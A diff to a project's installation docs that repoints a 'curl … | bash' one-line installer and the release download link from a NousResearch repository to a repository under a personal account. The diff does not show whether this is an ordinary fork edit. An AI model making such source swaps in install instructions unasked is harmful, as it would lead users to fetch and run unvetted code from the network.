@@ -61,12 +61,12 @@ PyPI releases track tagged versions (major/minor releases), not every commit on 
 
 ```bash
 # Linux / macOS / WSL2 / Android (Termux)
-curl -fsSL https://raw.githubusercontent.com/NousResearch/savarez-agent/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/AnandaAnugrahHandyanto/savarez_agent/main/scripts/install.sh | bash
 ```
 
 Prefer native installers for desktop use?
 
-- **Desktop downloads:** [GitHub Releases](https://github.com/NousResearch/savarez-agent/releases/latest)
+- **Desktop downloads:** [GitHub Releases](https://github.com/AnandaAnugrahHandyanto/savarez_agent/releases/latest)
 
 :::tip Android / Termux
 If you're installing on a phone, see the dedicated [Termux guide](./termux.md) for the tested manual path, supported extras, and current Android-specific limitations.
